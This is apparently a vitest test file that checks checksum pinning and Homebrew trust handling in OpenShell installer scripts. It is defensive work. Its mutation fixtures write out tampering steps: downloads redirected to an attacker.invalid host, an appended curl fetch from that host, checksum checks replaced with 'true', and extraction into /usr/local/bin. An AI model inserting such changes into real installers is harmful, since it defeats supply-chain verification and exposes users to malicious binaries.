// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { afterEach, describe, expect, it } from "vitest";

const REPO_ROOT = path.join(import.meta.dirname, "..");
const INSTALLER_TEMPLATE = fs.readFileSync(
  path.join(REPO_ROOT, "scripts/install-openshell.sh"),
  "utf8",
);
const BREV_TEMPLATE = fs.readFileSync(
  path.join(REPO_ROOT, "scripts/brev-launchable-ci-cpu.sh"),
  "utf8",
);
const ASSET_DIGESTS = new Map([
  [
    "openshell-x86_64-unknown-linux-musl.tar.gz",
    "37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4",
  ],
  [
    "openshell-aarch64-unknown-linux-musl.tar.gz",
    "a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045",
  ],
  [
    "openshell-aarch64-apple-darwin.tar.gz",
    "117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d",
  ],
  [
    "openshell-gateway-x86_64-unknown-linux-gnu.tar.gz",
    "03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877",
  ],
  [
    "openshell-gateway-aarch64-unknown-linux-gnu.tar.gz",
    "a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108",
  ],
  [
    "openshell-gateway-aarch64-apple-darwin.tar.gz",
    "8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb",
  ],
  [
    "openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz",
    "811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230",
  ],
  [
    "openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz",
    "2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0",
  ],
  ["openshell.rb", "4b75a7e3a7630eb8954d73ca828b394d5e0646adbaa4b087b2435329d53b61b3"],
]);
const FORMULA_ASSET = "openshell.rb";
const FORMULA_DIGEST = ASSET_DIGESTS.get(FORMULA_ASSET)!;
const V00101_SANDBOX_BUILD_DIGESTS = [
  "a2704babbb468fd0a359bfdd9844de71095b730758541b4ca8cbab77d4018920",
  "88300e35f153123e4dc3021c537834dd6c0a09665a4a6d3974cd285d512345c4",
] as const;
const SYNTHETIC_SANDBOX_BUILD_DIGESTS = ["a".repeat(64), "b".repeat(64)] as const;
const ASSETS = [...ASSET_DIGESTS.keys()].filter((asset) => asset !== FORMULA_ASSET);
const INSTALLER_ASSETS = [...ASSETS, FORMULA_ASSET];
const UNPUBLISHED_ASSET = "openshell-sandbox-aarch64-unknown-linux-gnu-unpublished.tar.gz";
const OFFICIAL_UNEXPECTED_INSTALLER_ASSET = "openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz";
const OFFICIAL_UNEXPECTED_INSTALLER_DIGEST =
  "911dd804074c620b3ba353f17e39a8195222c0764072621a154164432d7906d0";
const OFFICIAL_UNEXPECTED_BREV_ASSET = "openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz";
const OFFICIAL_UNEXPECTED_BREV_DIGEST =
  "5e6ba04030938e7be21b8b83af9a34b888deffb4c65e7e70dd6845c3bc7e264f";
const SYMLINK_INPUT_MARKER = "LEAK565";
type FixtureMode =
  | "allowlisted-alternate-version"
  | "brev-bypassed-comparison"
  | "brev-changed-asset"
  | "brev-changed-extraction-target"
  | "brev-changed-url"
  | "brev-comment-decoy"
  | "brev-dead-code-decoy"
  | "brev-decoy-table"
  | "brev-bypassed-verifier-call"
  | "brev-extra-download"
  | "brev-indirect-selector-override"
  | "brev-later-selector-override"
  | "brev-literalized-pin-selector"
  | "brev-mismatch"
  | "brev-sha-command-bypass"
  | "complete"
  | "duplicate-brev-pin"
  | "duplicate-installer-pin"
  | "failure"
  | "formula-mismatch"
  | "formula-pin-mismatch"
  | "formula-self-authorized"
  | "incomplete-trusted-allowlist"
  | "installer-max-version-drift"
  | "installer-bypassed-comparison"
  | "installer-changed-asset"
  | "installer-changed-checksum"
  | "installer-changed-extraction-target"
  | "installer-changed-url"
  | "installer-comment-decoy"
  | "installer-dead-code-decoy"
  | "installer-decoy-table"
  | "installer-dev-min-version-drift"
  | "installer-extra-download"
  | "installer-indirect-selector-override"
  | "installer-later-min-selector-override"
  | "installer-later-selector-override"
  | "installer-literalized-pin-input"
  | "installer-min-version-drift"
  | "installer-homebrew-untrust-cleanup-drift"
  | "installer-homebrew-trust-transition-drift"
  | "installer-homebrew-trust-transition-stable-leak"
  | "installer-homebrew-trust-transition-complete-current"
  | "installer-pin-selector-drift"
  | "installer-sha-command-bypass"
  | "mismatched-table-versions"
  | "missing-brev-pin"
  | "missing-trusted-formula"
  | "malformed-trusted-formula"
  | "mismatched-trusted-formula-url"
  | "multiple-installer-versions"
  | "non-regular-brev-input"
  | "official-but-unexpected-brev-asset"
  | "official-but-unexpected-installer-asset"
  | "oversized-installer-input"
  | "partial"
  | "partial-asset-missing"
  | "partial-manifest-missing"
  | "pr-checker-bypass"
  | "pr-parser-bypass"
  | "brev-stable-version-drift"
  | "runtime-consumers-newer-than-tables"
  | "symlink-installer-input"
  | "symlink-scripts-parent"
  | "duplicate-trusted-formula"
  | "trusted-sandbox-alternate-version"
  | "trusted-formula-mismatch";
type PinFormatting =
  | "canonical"
  | "comments"
  | "equals-whitespace"
  | "line-continuations"
  | "mixed-whitespace"
  | "quote-styles";

const corruptFirstBrevPin = (source: string): string =>
  source.replace(ASSET_DIGESTS.get(ASSETS[0]) ?? "missing", "0".repeat(64));
const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "brev-bypassed-comparison": (source) =>
    source.replace('[[ "$release_sha" == "$expected_sha" ]]', "true"),
  "brev-changed-asset": (source) =>
    source.replace(
      'openshell-x86_64-unknown-linux-musl.tar.gz" ;;',
      'openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz" ;;',
    ),
  "brev-changed-extraction-target": (source) =>
    source.replace(
      'tar xzf "$tmpdir/$asset" -C "$tmpdir"',
      'tar xzf "$tmpdir/$asset" -C /usr/local/bin',
    ),
  "brev-changed-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/${OPENSHELL_VERSION}/${asset}",
      "https://attacker.invalid/openshell/${OPENSHELL_VERSION}/${asset}",
    ),
  "brev-comment-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
    const comparison = '[[ "$release_sha" == "$expected_sha" ]]';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
  },
  "brev-dead-code-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"')}\nif false; then\n  ${lookup}\nfi\n`;
  },
  "brev-decoy-table": (source) =>
    source.replace(
      'openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
      'attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
    ),
  "brev-bypassed-verifier-call": (source) =>
    source.replace('verify_openshell_cli_asset "$tmpdir" "$asset"', ":"),
  "brev-extra-download": (source) => `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
  "brev-indirect-selector-override": (source) =>
    `${source}\nselector=OPENSHELL_VERSION\ndeclare "$selector=v9.9.9"\n`,
  "brev-later-selector-override": (source) => `${source}\nOPENSHELL_VERSION="v9.9.9"\n`,
  "brev-literalized-pin-selector": (source) =>
    source.replace('case "${release_tag}:${asset}" in', "case '${release_tag}:${asset}' in"),
  "brev-mismatch": corruptFirstBrevPin,
  "brev-sha-command-bypass": (source) => source.replace("sha_cmd=(sha256sum)", "sha_cmd=(true)"),
  "duplicate-brev-pin": (source) => {
    const pinLine = `      printf '%s\\n' "${ASSET_DIGESTS.get(ASSETS[0])}"`;
    return source.replace(pinLine, `${pinLine}\n${pinLine}`);
  },
  "missing-brev-pin": (source) =>
    source.replace(ASSET_DIGESTS.get(ASSETS[1]) ?? "missing", "missing"),
  "mismatched-table-versions": (source) => source.replaceAll("v0.0.72:", "v0.0.73:"),
  "official-but-unexpected-brev-asset": (source) =>
    source
      .replace(`v0.0.72:${ASSETS[1]})`, `v0.0.72:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
      .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
  "pr-checker-bypass": corruptFirstBrevPin,
  "pr-parser-bypass": corruptFirstBrevPin,
  "brev-stable-version-drift": (source) =>
    source.replace(
      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
    ),
  "runtime-consumers-newer-than-tables": (source) =>
    source.replace(
      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
    ),
};
const mutateSandboxBuildFunction = (
  source: string,
  mutate: (functionSource: string) => string,
): string => {
  const start = source.indexOf("pinned_sandbox_build_version() {");
  const end = source.indexOf("\ncomponent_build_version() {", start);
  assert.notEqual(start, -1, "sandbox build function start marker must exist");
  assert.notEqual(end, -1, "sandbox build function end marker must exist");
  const functionSource = source.slice(start, end);
  const mutated = mutate(functionSource);
  assert.notEqual(
    mutated,
    functionSource,
    "sandbox build fixture mutation must change the function",
  );
  return `${source.slice(0, start)}${mutated}${source.slice(end)}`;
};

const addSandboxBuildPins = (
  source: string,
  version: string,
  digests: readonly [string, string],
): string =>
  mutateSandboxBuildFunction(source, (functionSource) =>
    functionSource.replace(
      "    *)",
      `    ${digests[0]} | \\
      ${digests[1]})
      printf '%s\\n' "${version}"
      ;;
    *)`,
    ),
  );

const HOMEBREW_TRUST_TRANSITION_REPLACEMENTS = [
  [
    `install_macos_homebrew_formula() {
  local tmpdir formula_file tap_formula_file formula_ref expected_sha actual_sha brew_prefix openshell_bin`,
    `cleanup_macos_homebrew_formula() {
  local status=$?
  trap - EXIT
  if [ -n "\${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF:-}" ]; then
    if ! brew untrust --formula "$OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF" >/dev/null; then
      warn "Homebrew could not remove temporary trust for \${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF}"
      exit 1
    fi
  fi
  if ! rm -rf "\${OPENSHELL_HOMEBREW_FORMULA_TMPDIR:-}"; then
    warn "Could not remove temporary OpenShell Homebrew formula files"
    status=1
  fi
  exit "$status"
}

install_macos_homebrew_formula() {
  local tmpdir formula_file tap_formula_file formula_ref expected_sha actual_sha brew_prefix openshell_bin
  local formula_checksum_verified=0 homebrew_trust_supported=0`,
    "cleanup function",
  ],
  [
    `  tmpdir="$(mktemp -d)"
  OPENSHELL_HOMEBREW_FORMULA_TMPDIR="$tmpdir"
  trap \x27rm -rf "\${OPENSHELL_HOMEBREW_FORMULA_TMPDIR:-}"\x27 EXIT`,
    `  tmpdir="$(mktemp -d)"
  OPENSHELL_HOMEBREW_FORMULA_TMPDIR="$tmpdir"
  OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF=""
  trap cleanup_macos_homebrew_formula EXIT`,
    "cleanup trap",
  ],
  [
    `    [ "$actual_sha" = "$expected_sha" ] \\
      || fail "OpenShell Homebrew formula checksum does not match NemoClaw-pinned $RELEASE_TAG digest"
  fi`,
    `    [ "$actual_sha" = "$expected_sha" ] \\
      || fail "OpenShell Homebrew formula checksum does not match NemoClaw-pinned $RELEASE_TAG digest"
    formula_checksum_verified=1
  fi`,
    "checksum state",
  ],
  [
    `  tap_formula_file="$(homebrew_formula_path "$HOMEBREW_TAP" "$HOMEBREW_FORMULA_NAME")"
  info "staging Homebrew formula in tap \${HOMEBREW_TAP}..."`,
    `  formula_ref="\${HOMEBREW_TAP}/\${HOMEBREW_FORMULA_NAME}"
  tap_formula_file="$(homebrew_formula_path "$HOMEBREW_TAP" "$HOMEBREW_FORMULA_NAME")"
  if brew help trust >/dev/null 2>&1; then
    homebrew_trust_supported=1
  fi
  if [ "$formula_checksum_verified" = "0" ] && [ "$homebrew_trust_supported" = "1" ]; then
    brew help untrust >/dev/null 2>&1 \\
      || fail "Homebrew supports formula trust but not the required untrust cleanup"
    brew untrust --formula "$formula_ref" >/dev/null \\
      || fail "Homebrew refused to remove inherited trust for the unverified OpenShell dev formula \${formula_ref}"
    OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF="$formula_ref"
  fi

  info "staging Homebrew formula in tap \${HOMEBREW_TAP}..."`,
    "pre-staging trust cleanup",
  ],
  [
    `  formula_ref="\${HOMEBREW_TAP}/\${HOMEBREW_FORMULA_NAME}"
  if brew list --formula "$HOMEBREW_FORMULA_NAME" >/dev/null 2>&1; then`,
    `  if [ "$formula_checksum_verified" = "1" ] && [ "$homebrew_trust_supported" = "1" ]; then
    brew trust --formula "$formula_ref" \\
      || fail "Homebrew refused to trust the checksum-verified OpenShell formula \${formula_ref}"
    OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF="$formula_ref"
  fi
  if brew list --formula "$HOMEBREW_FORMULA_NAME" >/dev/null 2>&1; then`,
    "stable trust",
  ],
  [
    `  else
    info "installing OpenShell with Homebrew..."
    brew install --formula "$formula_ref"
  fi

  brew_prefix="$(brew --prefix 2>/dev/null || true)"`,
    `  else
    info "installing OpenShell with Homebrew..."
    brew install --formula "$formula_ref"
  fi
  if [ -n "$OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF" ]; then
    brew untrust --formula "$OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF" >/dev/null \\
      || fail "Homebrew refused to remove temporary trust for OpenShell formula \${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF}"
    OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF=""
  fi

  brew_prefix="$(brew --prefix 2>/dev/null || true)"`,
    "post-install trust cleanup",
  ],
] as const;

const restoreLegacyHomebrewTrustLifecycle = (source: string): string => {
  return HOMEBREW_TRUST_TRANSITION_REPLACEMENTS.reduce((current, [legacy, reviewed, label]) => {
    assert.ok(current.includes(reviewed), `installer Homebrew ${label} marker must exist`);
    return current.replace(reviewed, () => legacy);
  }, source);
};

const restorePersistentStableHomebrewTrust = (source: string): string => {
  const stableTrust = `    brew trust --formula "$formula_ref" \\
      || fail "Homebrew refused to trust the checksum-verified OpenShell formula \${formula_ref}"
    OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF="$formula_ref"`;
  assert.ok(source.includes(stableTrust), "temporary stable Homebrew trust marker must exist");
  return source
    .replace(
      stableTrust,
      `    brew trust --formula "$formula_ref" \\
      || fail "Homebrew refused to trust the checksum-verified OpenShell formula \${formula_ref}"`,
    )
    .replace(
      "Homebrew refused to remove temporary trust for OpenShell formula \${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF}",
      "Homebrew refused to remove temporary trust for the unverified OpenShell dev formula \${formula_ref}",
    );
};

const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "duplicate-installer-pin": (source) => {
    const asset = ASSETS[0];
    const digest = ASSET_DIGESTS.get(asset ?? "") ?? "missing";
    const arm = `    v0.0.72:${asset})
      printf '%s\\n' "${digest}"
      ;;`;
    assert.ok(source.includes(arm), "installer duplicate-pin fixture arm must exist");
    return source.replace(arm, `${arm}\n${arm}`);
  },
  "formula-pin-mismatch": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
  "formula-self-authorized": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
  "installer-bypassed-comparison": (source) =>
    source.replace('[ "$release_sha" = "$expected_sha" ]', "true"),
  "installer-changed-asset": (source) =>
    source.replace(
      'ASSETS+=("openshell-gateway-x86_64-unknown-linux-gnu.tar.gz")',
      'ASSETS+=("openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz")',
    ),
  "installer-changed-checksum": (source) =>
    source.replace(
      'CHECKSUM_FILES+=("openshell-sandbox-checksums-sha256.txt")',
      'CHECKSUM_FILES+=("openshell-checksums-sha256.txt")',
    ),
  "installer-changed-extraction-target": (source) =>
    source.replace(
      'tar xzf "$tmpdir/$asset_name" -C "$tmpdir"',
      'tar xzf "$tmpdir/$asset_name" -C /usr/local/bin',
    ),
  "installer-changed-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/${RELEASE_TAG}/$name",
      "https://attacker.invalid/openshell/${RELEASE_TAG}/$name",
    ),
  "installer-comment-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
    const comparison = '[ "$release_sha" = "$expected_sha" ]';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
  },
  "installer-dead-code-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"')}\nif false; then\n  ${lookup}\nfi\n`;
  },
  "installer-decoy-table": (source) =>
    source.replace(
      'openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
      'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
    ),
  "installer-dev-min-version-drift": (source) =>
    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.85"'),
  "installer-extra-download": (source) =>
    `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
  "installer-indirect-selector-override": (source) =>
    `${source}\nselector=RELEASE_TAG\ndeclare "$selector=v9.9.9"\n`,
  "installer-later-min-selector-override": (source) => `${source}\nMIN_VERSION="9.9.9"\n`,
  "installer-later-selector-override": (source) => `${source}\nPIN_VERSION="9.9.9"\n`,
  "installer-literalized-pin-input": (source) =>
    source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
  "installer-min-version-drift": (source) =>
    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.85"'),
  "installer-homebrew-trust-transition-complete-current": restoreLegacyHomebrewTrustLifecycle,
  "installer-homebrew-trust-transition-drift": (source) =>
    source.replace(
      'brew trust --formula "$formula_ref" \\',
      'brew trust --formula "$HOMEBREW_TAP" \\',
    ),
  "installer-homebrew-untrust-cleanup-drift": (source) =>
    source.replace(
      `      warn "Homebrew could not remove temporary trust for \${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF}"
      exit 1`,
      `      warn "Homebrew could not remove temporary trust for \${OPENSHELL_HOMEBREW_UNTRUST_FORMULA_REF}"
      status=1`,
    ),
  "installer-homebrew-trust-transition-stable-leak": (source) =>
    restorePersistentStableHomebrewTrust(source),
  "installer-max-version-drift": (source) =>
    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
  "installer-pin-selector-drift": (source) =>
    source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
  "installer-sha-command-bypass": (source) =>
    source.replace('SHA_CMD="sha256sum"', 'SHA_CMD="true"'),
  "multiple-installer-versions": (source) =>
    source.replace(`v0.0.72:${ASSETS[0]}`, `v0.0.73:${ASSETS[0]}`),
  "official-but-unexpected-installer-asset": (source) =>
    source
      .replace(ASSETS.at(-1) ?? "missing", OFFICIAL_UNEXPECTED_INSTALLER_ASSET)
      .replace(
        ASSET_DIGESTS.get(ASSETS.at(-1) ?? "") ?? "missing",
        OFFICIAL_UNEXPECTED_INSTALLER_DIGEST,
      ),
  "partial-asset-missing": (source) =>
    source.replace(ASSETS.at(-1) ?? "missing", UNPUBLISHED_ASSET),
  "runtime-consumers-newer-than-tables": (source) =>
    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
};

type InputMutationContext = {
  blueprint: string;
  brevInstaller: string;
  fixtureRoot: string;
  installer: string;
};
const INPUT_MUTATIONS: Partial<Record<FixtureMode, (context: InputMutationContext) => void>> = {
  "runtime-consumers-newer-than-tables": ({ blueprint }) => {
    const source = fs.readFileSync(blueprint, "utf8");
    fs.writeFileSync(blueprint, source.replace('"0.0.72"', '"0.0.85"'));
  },
  "non-regular-brev-input": ({ brevInstaller }) => {
    fs.rmSync(brevInstaller);
    fs.mkdirSync(brevInstaller);
  },
  "oversized-installer-input": ({ installer }) => {
    fs.appendFileSync(installer, `\n# ${"x".repeat(1024 * 1024)}\n`);
  },
  "symlink-installer-input": ({ fixtureRoot, installer }) => {
    const symlinkTarget = path.join(fixtureRoot, "valid-installer-target.sh");
    fs.renameSync(installer, symlinkTarget);
    fs.writeFileSync(symlinkTarget, `""\n${SYMLINK_INPUT_MARKER}\n`);
    fs.symlinkSync(symlinkTarget, installer);
  },
  "symlink-scripts-parent": ({ fixtureRoot }) => {
    const candidateScriptsDir = path.join(fixtureRoot, "scripts");
    const scriptsTarget = path.join(fixtureRoot, "candidate-scripts-target");
    fs.renameSync(candidateScriptsDir, scriptsTarget);
    fs.writeFileSync(
      path.join(scriptsTarget, "install-openshell.sh"),
      `""\n${SYMLINK_INPUT_MARKER}\n`,
    );
    fs.symlinkSync(scriptsTarget, candidateScriptsDir, "dir");
  },
};
const CHECKSUM_MANIFESTS = new Map([
  [
    "openshell-checksums-sha256.txt",
    `37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4  openshell-x86_64-unknown-linux-musl.tar.gz
a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045  openshell-aarch64-unknown-linux-musl.tar.gz
117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d  openshell-aarch64-apple-darwin.tar.gz
911dd804074c620b3ba353f17e39a8195222c0764072621a154164432d7906d0  openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz
5e6ba04030938e7be21b8b83af9a34b888deffb4c65e7e70dd6845c3bc7e264f  openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz
cdcdf0d0b5a231c0c7631787de014462093ffdeb5c85de853594fd215b0fa98a  openshell-driver-vm-aarch64-apple-darwin.tar.gz
f4807cdaf3598c1fbcd0f35c888bf7f42210e1f4ab27700a1200d5bf80e56e9a  openshell_0.0.72-1_amd64.deb
e38eca3badbba827c7342e2d738b277c8714081a54700ce4dc6c5395e1608d6b  openshell_0.0.72-1_arm64.deb
626aa3c781027231a2085ebbdb5a4e2ae88c1c0977bfb1fd7ddaab501efe37c5  openshell-0.0.72-1.fc44.aarch64.rpm
abca83026aa8192a82c54316e6f15f38583fdd59d936535d07fe7bb5e6824a32  openshell-0.0.72-1.fc44.x86_64.rpm
cf349d3cd5fb5f05419ee088a4784206ce117af07f427e0667290955659c7530  openshell-gateway-0.0.72-1.fc44.aarch64.rpm
523087b888d6641a1798c3400492028d5c236870f321ab87d28918e3ae523c20  openshell-gateway-0.0.72-1.fc44.x86_64.rpm
fc590490e1a89c00b8f95b5449de9107cb9f070bd4a8cefb0f2389baf0d95f67  openshell-0.0.72-py3-none-macosx_13_0_arm64.whl
e104152e6840dc2bed10856251ed6b3a020ed5f5550e735a325028a0990b475b  openshell-0.0.72-py3-none-manylinux_2_39_aarch64.whl
c7feaca0c8c97ace952bd047408a91732fbcb298517481152d8e53d49c5fc88f  openshell-0.0.72-py3-none-manylinux_2_39_x86_64.whl
`,
  ],
  [
    "openshell-gateway-checksums-sha256.txt",
    `03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877  openshell-gateway-x86_64-unknown-linux-gnu.tar.gz
a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108  openshell-gateway-aarch64-unknown-linux-gnu.tar.gz
8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb  openshell-gateway-aarch64-apple-darwin.tar.gz
`,
  ],
  [
    "openshell-sandbox-checksums-sha256.txt",
    `811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230  openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz
2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0  openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz
`,
  ],
]);
const V0099_CHECKSUM_MANIFESTS = new Map([
  [
    "openshell-checksums-sha256.txt",
    `35725a358e42ef7f0f0393035536da317706b0febcc459a2011e0555f6c2b71c  openshell-x86_64-unknown-linux-musl.tar.gz
d00cbf0d8779c01ddea6453ead2ad4db3d89a1f14eb6f0785f7919f42813a279  openshell-aarch64-unknown-linux-musl.tar.gz
e31cac5360e2adf3c971d5742a516626c58acf2fd3db4dcb0e45804def3dc844  openshell-aarch64-apple-darwin.tar.gz
6f1f0a7a524850edddba52aa233eb53233ad77b9b85a8eee1bdd004e2ace8b6e  openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz
4cb1dba9f29fec3111a7858f1bb4f9344d321ce7aa080c6e4ab0e69e8f2761fa  openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz
195f865d304518cbf2270bf7d54326390fd0755692a2856ae7c5e7a9f6e38a99  openshell-driver-vm-aarch64-apple-darwin.tar.gz
0d22a9cac0ca7d080c95ea032df81af382d8889149d959f5c547cf00c05a5918  openshell_0.0.99-1_amd64.deb
33a9031a57f006e1ed4c0b409aa07a0b4246ee655eec51e74dc872b5f2ec7cc6  openshell_0.0.99-1_arm64.deb
91e2fc11e09eb4bc4c52e2d512b10224f5e025bda7366c313739bc8301108125  openshell-0.0.99-1.fc44.aarch64.rpm
5625914d36939bb02a0e1b6564067c1fc4efd429145ffc4691edbe1ca13dc490  openshell-0.0.99-1.fc44.x86_64.rpm
68aa1f07b36ff10cdce89b3d6b75f0ebaeac1d063e382d7d234488ec4533ab06  openshell-gateway-0.0.99-1.fc44.aarch64.rpm
f91ed9de71e51c6365e5c934225833b9d8a4cd3b62da8060919fc7993fe7d6b9  openshell-gateway-0.0.99-1.fc44.x86_64.rpm
f7db8eb284fa0815c0ab375016def8524873ee033049940f071ffef4d0c1a61e  openshell-0.0.99-py3-none-macosx_13_0_arm64.whl
b06e062563201d4f98a87e8de23e10e40733b548e12891623982ca5b120bccf2  openshell-0.0.99-py3-none-manylinux_2_39_aarch64.whl
72f8f14c304f5da233755ae285ee8c4c19aaf7fb7b40b14f6c6b17ef9752141f  openshell-0.0.99-py3-none-manylinux_2_39_x86_64.whl
`,
  ],
  [
    "openshell-gateway-checksums-sha256.txt",
    `640d204dc3c6bc28bffa1f3d870897fc23bbc5ec0151a6c642083e958455cb49  openshell-gateway-x86_64-unknown-linux-gnu.tar.gz
3a5d3092ae34356beb0ff2a920f9a87af4233c7a1086a53cd9429d48358f5c09  openshell-gateway-aarch64-unknown-linux-gnu.tar.gz
4340619292ecb565f90eb2250db504baa37dd410361b366b42e174d34512cb6c  openshell-gateway-aarch64-apple-darwin.tar.gz
`,
  ],
  [
    "openshell-sandbox-checksums-sha256.txt",
    `84caed3dec4390e0938e89b38b1256d31e8970b4bfd85437bf92ed79f5b1ff05  openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz
c758e7dc2b8c904baa01e2ccce0f08daf96ede0c648478b23346d8c4dd16f432  openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz
`,
  ],
]);
const V0099_ASSET_DIGESTS = new Map([
  ...[...V0099_CHECKSUM_MANIFESTS.values()].flatMap((contents) =>
    contents
      .trim()
      .split("\n")
      .map((line) => {
        const [digest, asset] = line.split(/\s+/);
        return [asset, digest] as const;
      }),
  ),
  ["openshell.rb", "8dd34fc17ee9a30327664a18c9509c8a765cb010de38cda8e22841bddbe92713"],
]);
const V00101_CHECKSUM_MANIFESTS = new Map([
  [
    "openshell-checksums-sha256.txt",
    `7d49ab2a5ff0b826bd2bdca5e0244010f832dfc6901c808ea8c8467004c26913  openshell-x86_64-unknown-linux-musl.tar.gz
b553d3bfc08e9354b990a10fb8abd976e039afeec2d3947f8a112018be40d296  openshell-aarch64-unknown-linux-musl.tar.gz
9daaccdb9e30e220d56dd6d6bf4bd00ccca8ae4ad2845f5f0d9b9da3eb8ee881  openshell-aarch64-apple-darwin.tar.gz
087c261d1594aace6f179710f07406bc03163aa37f1c87b8290eeb21ee81352f  openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz
670039e6f973e35f7eac98b1e34ffdcdfcda7f094019bdec02007b4c0eaa0a43  openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz
a7bf38218aa6c85ed73217b501f9fa44c32861fd48aa4a9141aa1fe478b7dc5b  openshell-driver-vm-aarch64-apple-darwin.tar.gz
4b8e3deb2d3a4ec7b6fd05fbeaee58dfafc670a629077c3d80e85882211abddd  openshell_0.0.101-1_amd64.deb
0087dab1206c8dbdec455ae65434b881033757b2a094ecf3a6f416c81057aeee  openshell_0.0.101-1_arm64.deb
49be637bf2792910ae6f551f770de44ed869d10f28363236de0a96e4d093213b  openshell-0.0.101-1.fc44.aarch64.rpm
e77a96379dce740b11bbec969cc4c9ba6959129af21673346978d5ed20fa3127  openshell-0.0.101-1.fc44.x86_64.rpm
